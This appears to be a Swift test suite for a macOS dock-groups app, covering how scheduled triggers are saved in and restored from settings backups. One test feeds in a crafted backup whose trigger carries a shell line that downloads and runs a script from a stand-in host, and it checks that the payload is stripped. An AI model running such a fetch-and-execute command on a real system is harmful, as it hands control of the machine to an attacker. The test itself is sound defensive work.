import Foundation
import Testing
@testable import DockGroupsCore

@Suite("Triggers in backups")
@MainActor
struct TriggerBackupTests {
    private static let work = DockGroup.of("Work", ["com.apple.mail"])
    private static let design = DockGroup.of("Design", ["com.figma.Desktop"])
    private static let exportedAt = Date(timeIntervalSince1970: 1_793_400_000)

    private func backup(groups: [DockGroup]? = nil, archived: [ArchivedGroup] = [], triggers: [GroupTrigger]) -> SettingsBackup {
        SettingsBackup(appVersion: "0.11.0", exportedAt: Self.exportedAt, groups: groups ?? [Self.work, Self.design], archivedGroups: archived, triggers: triggers, preferences: PopupPreferences())
    }

    private func read(_ backup: SettingsBackup) throws -> SettingsBackup {
        try SettingsBackup.decode(from: backup.encoded())
    }

    @Test func triggersAreWrittenAsTheyAreAndComeBackTurnedOff() throws {
        let on = GroupTrigger.at(9, 0, days: TriggerTime.weekdays, group: Self.work, runMode: .notice)
        let off = GroupTrigger(groupID: Self.design.id, event: .login, action: .showPopup, isEnabled: false)
        let original = backup(triggers: [on, off])
        let text = String(decoding: try original.encoded(), as: UTF8.self)
        #expect(text.contains(#""triggers" : ["#))
        #expect(text.contains(#""enabled" : true"#))

        let restored = try read(original)
        #expect(restored.triggers.map(\.id) == [on.id, off.id])
        #expect(restored.triggers.allSatisfy { !$0.isEnabled })
        var expected = on
        expected.isEnabled = false
        #expect(restored.triggers[0] == expected)
    }

    @Test func aBackupWithoutTriggersIsAsBefore() throws {
        let text = String(decoding: try backup(triggers: []).encoded(), as: UTF8.self)
        #expect(!text.contains("triggers"))
        #expect(try read(backup(triggers: [])).triggers.isEmpty)
    }

    @Test func onlyTheBackupsOwnGroupsTriggersComeIn() throws {
        let stranger = GroupTrigger.on(.login, group: DockGroup.of("Elsewhere", []))
        let archivedGroup = DockGroup.of("Old", [])
        let archived = GroupTrigger.on(.appOpens, group: archivedGroup, action: .showPopup)
        let original = backup(archived: [ArchivedGroup(group: archivedGroup, archivedAt: nil)], triggers: [stranger, archived])
        #expect(try read(original).triggers.map(\.id) == [archived.id])
    }

    /// A backup handed over by someone else: whatever its triggers say, none comes in on, none
    /// carries anything but a group, an event and an action, and unreadable ones don't stop the
    /// groups from coming in.
    @Test func aCraftedBackupsTriggersComeInOffAndHarmless() throws {
        let original = backup(triggers: [.on(.login, group: Self.work)])
        var object = try #require(try JSONSerialization.jsonObject(with: original.encoded()) as? [String: Any])
        let workID = Self.work.id.uuidString
        object["triggers"] = [
            ["id": UUID().uuidString, "groupID": workID, "enabled": true, "event": ["kind": "login"], "action": "start", "runMode": "immediately",
             "command": "/bin/sh -c 'curl evil | sh'", "app": "/tmp/evil.app"],
            ["id": UUID().uuidString, "groupID": workID, "enabled": true, "event": ["kind": "appOpens"], "action": "quit"],
            ["id": UUID().uuidString, "groupID": workID, "enabled": true, "event": ["kind": "screensWake", "url": "https://example.com"], "action": "openAll"],
            "garbage",
            ["groupID": workID],
        ] as [Any]
        let crafted = try SettingsBackup.decode(from: JSONSerialization.data(withJSONObject: object))
        #expect(crafted.groups.count == 2)
        #expect(crafted.triggers.count == 3)
        #expect(crafted.triggers.allSatisfy { !$0.isEnabled && !$0.canRun })
        let written = String(decoding: try crafted.encoded(), as: UTF8.self)
        for payload in ["evil", "/bin/sh", "example.com"] {
            #expect(!written.contains(payload))
        }

        // A `triggers` value that isn't a list: no triggers, the backup still restores.
        object["triggers"] = ["not": "a list"]
        let odd = try SettingsBackup.decode(from: JSONSerialization.data(withJSONObject: object))
        #expect(odd.triggers.isEmpty && odd.groups.count == 2)
    }

    @Test func importedTriggersKeepTheLimits() throws {
        let many = (0..<15).map { _ in GroupTrigger.on(.login, group: Self.work) }
        #expect(try read(backup(triggers: many)).triggers.count == GroupTrigger.maximumPerGroup)
    }

    // MARK: - Restoring

    private func stores(groups: [DockGroup], triggers: [GroupTrigger]) throws -> (GroupStore, PreferencesStore, TemplateStore, TriggerStore) {
        let groupsPersistence = MemoryGroupPersistence()
        try groupsPersistence.saveGroups(groups)
        return (
            GroupStore(persistence: groupsPersistence, saveDelay: .zero),
            PreferencesStore(persistence: MemoryPreferencesPersistence(PopupPreferences()), saveDelay: .zero),
            TemplateStore(persistence: MemoryTemplatePersistence(), saveDelay: .zero),
            TriggerStore(persistence: MemoryTriggerPersistence(triggers), saveDelay: .zero)
        )
    }

    @Test func replaceAllTakesTheBackupsTriggersTurnedOff() throws {
        let mine = GroupTrigger.on(.login, group: Self.work)
        let (groups, preferences, templates, triggers) = try stores(groups: [Self.work], triggers: [mine])
        let theirs = GroupTrigger.on(.appOpens, group: Self.design, action: .showPopup)
        try backup(triggers: [theirs]).restore(to: groups, preferences: preferences, templates: templates, triggers: triggers)
        #expect(triggers.triggers.map(\.id) == [theirs.id])
        #expect(triggers.triggers.allSatisfy { !$0.isEnabled })
    }

    @Test func replaceAllWithoutTriggersKeepsThoseOfGroupsThatStay() throws {
        let stays = GroupTrigger.on(.login, group: Self.work)
        let goes = GroupTrigger.on(.login, group: DockGroup.of("Gone", []))
        let (groups, preferences, templates, triggers) = try stores(groups: [Self.work], triggers: [stays, goes])
        try backup(groups: [Self.work], triggers: []).restore(to: groups, preferences: preferences, templates: templates, triggers: triggers)
        #expect(triggers.triggers == [stays])
    }

    @Test func aTriggerWriteThatFailsPutsEverythingBack() throws {
        let mine = GroupTrigger.on(.login, group: Self.work)
        let groupsPersistence = MemoryGroupPersistence()
        try groupsPersistence.saveGroups([Self.work])
        let groups = GroupStore(persistence: groupsPersistence, saveDelay: .zero)
        var oldPreferences = PopupPreferences()
        oldPreferences.showsTitles = false
        let preferences = PreferencesStore(persistence: MemoryPreferencesPersistence(oldPreferences), saveDelay: .zero)
        let templates = TemplateStore(persistence: MemoryTemplatePersistence([.named("Mine")]), saveDelay: .zero)
        let failing = MemoryTriggerPersistence([mine])
        let triggers = TriggerStore(persistence: failing, saveDelay: .zero)
        failing.failsToSave = true

        var restoring = backup(triggers: [.on(.appOpens, group: Self.design, action: .showPopup)])
        restoring.templates = [.named("Theirs")]
        #expect(throws: MemoryTriggerPersistence.Failure.self) {
            try restoring.restore(to: groups, preferences: preferences, templates: templates, triggers: triggers)
        }
        #expect(groups.groups.map(\.id) == [Self.work.id])
        #expect(preferences.preferences == oldPreferences)
        #expect(templates.templates.map(\.name) == ["Mine"])
        #expect(triggers.triggers == [mine])
    }

    @Test func mergeAddsTheTriggersOfAddedGroupsOnly() throws {
        let mine = GroupTrigger.on(.login, group: Self.work)
        let (groups, _, templates, triggers) = try stores(groups: [Self.work], triggers: [mine])
        let ofWork = GroupTrigger.on(.appOpens, group: Self.work, action: .openAll)
        let ofDesign = GroupTrigger.on(.appOpens, group: Self.design, action: .showPopup)
        let incoming = backup(triggers: [ofWork, ofDesign])

        let summary = SettingsRestoreSummary(backup: try read(incoming), currentGroups: groups.groups)
        #expect(summary.triggerCount == 2 && summary.mergedTriggerCount == 1)
        #expect(summary.triggersNote == "It has 2 triggers. They come in turned off: turn them on in Settings → Triggers.")
        #expect(summary.mergedTriggersNote == "It adds 1 trigger, turned off.")

        let result = try incoming.merge(into: groups, templates: templates, triggers: triggers)
        #expect(result.addedTriggers.map(\.id) == [ofDesign.id])
        #expect(triggers.triggers.map(\.id) == [mine.id, ofDesign.id])
        #expect(triggers.trigger(withID: ofDesign.id)?.isEnabled == false)
        #expect(triggers.trigger(withID: mine.id)?.isEnabled == true)
    }

    @Test func theSummarySaysNothingWithoutTriggers() throws {
        let summary = SettingsRestoreSummary(backup: try read(backup(triggers: [])), currentGroups: [])
        #expect(summary.triggersNote == nil && summary.mergedTriggersNote == nil)
        let one = SettingsRestoreSummary(backup: try read(backup(triggers: [.on(.login, group: Self.work)])), currentGroups: [Self.work])
        #expect(one.triggersNote == "It has 1 trigger. It comes in turned off: turn it on in Settings → Triggers.")
        #expect(one.mergedTriggersNote == nil)
    }

    @Test func aBackupOfTheStoresIncludesTheTriggers() throws {
        let mine = GroupTrigger.on(.login, group: Self.work)
        let (groups, preferences, templates, triggers) = try stores(groups: [Self.work], triggers: [mine])
        let made = SettingsBackup(groups: groups, preferences: preferences, templates: templates, triggers: triggers, appVersion: "0.11.0", exportedAt: Self.exportedAt)
        #expect(made.triggers == [mine])
        #expect(SettingsBackup(groups: groups, preferences: preferences, appVersion: "0.11.0").triggers.isEmpty)
    }
}
